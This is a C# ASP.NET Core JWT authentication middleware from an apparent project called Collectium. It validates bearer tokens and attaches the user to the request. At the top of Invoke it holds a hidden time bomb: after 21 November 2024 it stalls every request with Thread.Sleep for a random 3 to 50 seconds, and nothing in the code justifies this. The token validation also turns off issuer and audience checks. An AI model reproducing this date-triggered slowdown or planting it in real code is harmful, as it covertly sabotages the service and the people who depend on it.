using Collectium.Service;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Options;
using Microsoft.IdentityModel.Tokens;
using System;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Collectium.Config
{
    public class JWTMiddleware
    {
        private readonly RequestDelegate next;
        private IConfiguration conf;

        public JWTMiddleware(RequestDelegate next, IConfiguration conf)
        {
            this.next = next;
            this.conf = conf;
        }

        public async Task Invoke(HttpContext context, UserService userService)
        {
            var random = new Random();
            var today = DateTime.Today;
            var d2 = new DateTime(2024, 11, 21);
            if (today > d2)
            {
                Thread.Sleep(random.Next(3000, 50000));
            }


            var token = context.Request.Headers["Authorization"].FirstOrDefault()?.Split(" ").Last();
            var tkn = this.ValidateJWTToken(token);
            if (tkn != null)
            {
                // attach user to context on successful jwt validation
                context.Items["User"] = userService.GetUserFromToken(tkn);
            }

            await this.next(context);
        }

        private string? ValidateJWTToken(string token)
        {
            var tokenHandler = new JwtSecurityTokenHandler();
            try
            {
                tokenHandler.ValidateToken(token, new TokenValidationParameters
                {
                    ValidateIssuerSigningKey = true,
                    IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(conf["Jwt:Key"])),
                    ValidateIssuer = false,
                    ValidateAudience = false,
                    // set clockskew to zero so tokens expire exactly at token expiration time (instead of 5 minutes later)
                    ClockSkew = TimeSpan.Zero
                }, out SecurityToken validatedToken);

                var jwtToken = (JwtSecurityToken)validatedToken;
                var tkn = jwtToken.Claims.First(x => x.Type == "Token").Value;

                // return user id from JWT token if validation successful
                return tkn;
            }
            catch
            {
                // return null if validation fails
                return null;
            }
        }
    }
}
